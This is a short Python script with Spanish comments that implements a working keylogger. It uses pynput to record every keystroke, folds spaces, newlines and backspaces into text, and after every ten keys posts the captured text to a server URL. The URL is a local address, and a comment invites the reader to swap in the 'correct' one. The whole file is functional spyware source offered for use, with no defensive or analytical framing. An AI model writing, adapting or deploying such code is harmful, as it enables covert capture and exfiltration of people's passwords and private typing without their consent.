#Instalar pynput requests con el comando "pip install pynput requests" en Python3

from pynput import keyboard
import requests

# URL del servidor remoto donde enviar los datos (puedes cambiarlo por la URL correcta)
server_url = 'http://127.0.0.1:5000/keylog'

# Almacena las teclas pulsadas
keys = []

# Función que se ejecuta cada vez que se presiona una tecla
def on_press(key):
    try:
        # Si es una tecla alfabética o numérica, la guardamos tal cual
        keys.append(key.char)
    except AttributeError:
        # Si es una tecla especial, verificamos cuál es y hacemos algo específico
        if key == keyboard.Key.space:
            keys.append(' ')  # Convertimos "Key.space" en un espacio
        elif key == keyboard.Key.enter:
            keys.append('\n')  # Convertimos "Key.enter" en una nueva línea
        elif key == keyboard.Key.backspace:
            # Si es backspace, eliminamos el último carácter almacenado
            if keys:
                keys.pop()
        # Podemos ignorar otras teclas especiales como Caps Lock, Shift, etc.

    if len(keys) >= 10:  # Envía datos al servidor después de 10 teclas registradas
        send_keys()

# Función para enviar las teclas al servidor remoto
def send_keys():
    global keys
    data = ''.join(keys)  # Convierte la lista de teclas en una cadena de texto
    try:
        # Enviar las teclas capturadas al servidor
        response = requests.post(server_url, data={'keylogs': data})
        print(f"Enviando datos: {data}")
        # Limpiar la lista después de enviar
        keys = []
    except Exception as e:
        print(f"Error al enviar datos: {e}")

# Función que se ejecuta cuando se libera una tecla (opcional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Finaliza el keylogger cuando se presiona ESC
        return False

# Iniciar la captura de teclas
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
